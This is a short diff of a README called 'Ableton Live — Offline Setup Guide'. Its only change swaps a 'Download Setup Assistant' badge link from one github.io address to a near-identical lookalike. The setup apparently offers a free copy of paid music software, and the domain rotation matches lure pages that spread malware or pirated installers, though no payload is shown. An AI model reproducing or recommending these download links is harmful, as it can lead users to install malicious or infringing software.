@@ -1,6 +1,6 @@
 # Ableton Live — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ableton-live-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ableton-live-freedownload.github.io/.github/)
 
 ---
 
